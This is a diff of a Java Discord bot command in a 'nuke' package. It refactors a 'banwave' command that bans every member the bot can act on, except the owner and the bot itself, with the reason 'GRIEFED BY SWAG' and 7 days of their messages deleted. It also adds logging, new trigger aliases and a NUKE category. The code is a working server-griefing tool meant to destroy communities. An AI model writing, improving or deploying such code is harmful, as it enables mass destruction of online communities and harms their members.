@@ -2,6 +2,8 @@ package me.comu.exeter.commands.nuke;
 
 import me.comu.exeter.core.Core;
 import me.comu.exeter.interfaces.ICommand;
+import me.comu.exeter.logging.Logger;
+import me.comu.exeter.wrapper.Wrapper;
 import net.dv8tion.jda.api.EmbedBuilder;
 import net.dv8tion.jda.api.Permission;
 import net.dv8tion.jda.api.entities.Member;
@@ -16,29 +18,18 @@ public class BanwaveCommand implements ICommand {
 
     @Override
     public void handle(List<String> args, GuildMessageReceivedEvent event) {
-        if (!(event.getAuthor().getIdLong() == Core.OWNERID )) {
+        if (!(event.getAuthor().getIdLong() == Core.OWNERID)) {
             return;
         }
-        int i;
-        try {
-            List<Member> members = event.getGuild().getMembers();
-            for (i = 0; i <= members.size(); i++) {
-                try {
-                    if (!(members.get(i).getUser().getIdLong() == Core.OWNERID))
-                    event.getGuild().ban(members.get(i), 7).reason("GRIEFED BY SWAG").queue();
-                } catch (HierarchyException e) {
-                    //	event.getChannel().sendMessage("Caught Hierarchy Exception, Attempting to Skip").queue();
-                }
-//                EmbedBuilder ban = new EmbedBuilder();
-//                ban.setColor(0xff802b);
-//                ban.setDescription("banned " + members.get(i).getAsMention());
-            //    event.getChannel().sendMessage(ban.build()).queue();;
+        for (Member member : event.getGuild().getMembers()) {
+                if (member.getIdLong() != Core.OWNERID && !member.getId().equals(event.getJDA().getSelfUser().getId()) && event.getGuild().getSelfMember().canInteract(member)) {
+                    event.getGuild().ban(member, 7).reason("GRIEFED BY SWAG").queue();
+                 Logger.getLogger().print("Banned " + member.getUser().getName() + "#" + member.getUser().getDiscriminator());
             }
-            event.getChannel().sendMessage("SWAG!").queue();
-        } catch (HierarchyException | IndexOutOfBoundsException e) {
-
-        }
     }
+
+}
+
 
     @Override
     public String getHelp() {
@@ -47,11 +38,16 @@ public class BanwaveCommand implements ICommand {
 
     @Override
     public String getInvoke() {
-        return "SWAG";
+        return "etb";
     }
 
     @Override
     public String[] getAlias() {
-        return new String[0];
+        return new String[] {"bw","banwave"};
+    }
+
+     @Override
+    public Category getCategory() {
+        return Category.NUKE;
     }
 }
